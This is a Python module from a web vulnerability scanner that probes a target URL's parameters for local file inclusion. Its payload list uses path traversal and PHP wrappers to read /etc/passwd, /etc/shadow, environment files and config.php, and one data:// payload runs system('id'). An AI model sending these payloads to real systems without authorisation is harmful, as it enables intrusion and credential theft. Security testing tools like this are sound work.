#!/usr/bin/env python3
# modules/lfi.py — Local File Inclusion scanner for VXSN

import urllib.parse
from modules.base import BaseModule
from utils.colors import Colors, print_status, print_finding, print_section

LFI_PAYLOADS = [
    "../etc/passwd",
    "../../etc/passwd",
    "../../../etc/passwd",
    "../../../../etc/passwd",
    "../../../../../etc/passwd",
    "../../../../../../etc/passwd",
    "../../../../../../../etc/passwd",
    "....//....//etc/passwd",
    "....//....//....//etc/passwd",
    "%2e%2e%2fetc%2fpasswd",
    "%2e%2e/%2e%2e/etc/passwd",
    "..%2fetc%2fpasswd",
    "..%252fetc%252fpasswd",
    "/etc/passwd",
    "/etc/shadow",
    "/etc/hosts",
    "/proc/self/environ",
    "/proc/version",
    "C:\\Windows\\System32\\drivers\\etc\\hosts",
    "C:\\boot.ini",
    "..\\..\\..\\Windows\\System32\\drivers\\etc\\hosts",
    "php://filter/convert.base64-encode/resource=index.php",
    "php://filter/read=convert.base64-encode/resource=../config.php",
    "expect://id",
    "data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOyA/Pg==",
]

LFI_SIGNATURES = [
    "root:x:0:0",
    "root:!:",
    "daemon:x:",
    "/bin/bash",
    "/bin/sh",
    "nobody:x:",
    "[boot loader]",
    "\\windows\\system32",
    "for 16-bit app support",
    "localhost",
    "127.0.0.1",
    "linux version",
    "php_self",
    "document_root",
]


class LFIScanner(BaseModule):

    NAME        = "vuln/lfi"
    DESCRIPTION = "Local File Inclusion — path traversal payloads for file read detection"
    SEVERITY    = "HIGH"
    REFERENCES  = [
        "https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion",
        "https://portswigger.net/web-security/file-path-traversal",
    ]

    def _define_options(self):
        self._add_option("TARGET",  "",    True,  "Target URL (e.g. https://site.com/page.php?file=home)")
        self._add_option("PARAM",   "",    False, "Specific parameter to test (default: all)")
        self._add_option("METHOD",  "GET", False, "HTTP method: GET or POST")
        self._add_option("TIMEOUT", "10",  False, "Request timeout in seconds")
        self._add_option("DELAY",   "0",   False, "Delay between requests in seconds")

    def run(self) -> list:
        if not self._validate():
            return []

        target = self.get_option("TARGET").strip()
        method = self.get_option("METHOD").upper()
        self.client = self._init_client()

        params = self._extract_params(target)
        if not params:
            print_status("No parameters found. Include ?param=value in TARGET.", "warn")
            return []

        specific = self.get_option("PARAM")
        if specific:
            params = {k: v for k, v in params.items() if k == specific}

        print_section(f"LFI Scan — {target}")
        print_status(f"Parameters : {Colors.WHITE}{list(params.keys())}{Colors.RESET}", "info")
        print_status(f"Payloads   : {Colors.WHITE}{len(LFI_PAYLOADS)}{Colors.RESET}", "info")
        print()

        findings = []
        base_url = target.split("?")[0] if "?" in target else target

        for param in params:
            print_status(f"Testing parameter: {Colors.CYAN}{param}{Colors.RESET}", "run")
            for payload in LFI_PAYLOADS:
                test_params = dict(params)
                test_params[param] = payload

                if method == "POST":
                    code, body, _ = self.client.post(base_url, data=test_params)
                else:
                    code, body, _ = self.client.get(base_url, params=test_params)

                if code == 0:
                    continue

                body_lower = body.lower()
                for sig in LFI_SIGNATURES:
                    if sig.lower() in body_lower:
                        f = self._finding(
                            "Local File Inclusion", target, param, payload,
                            evidence=f"File signature found: '{sig}'"
                        )
                        print_finding(f["type"], target, param, payload,
                                      f["severity"], f["evidence"])
                        findings.append(f)
                        break

                if any(f["param"] == param for f in findings):
                    break

        print()
        if findings:
            print_status(f"Found {Colors.RED}{len(findings)}{Colors.RESET} LFI vulnerability(ies).", "ok")
        else:
            print_status("No LFI vulnerabilities detected.", "safe")

        return findings

    def _extract_params(self, url: str) -> dict:
        if "?" in url:
            qs = url.split("?", 1)[1]
            return dict(urllib.parse.parse_qsl(qs))
        return {}
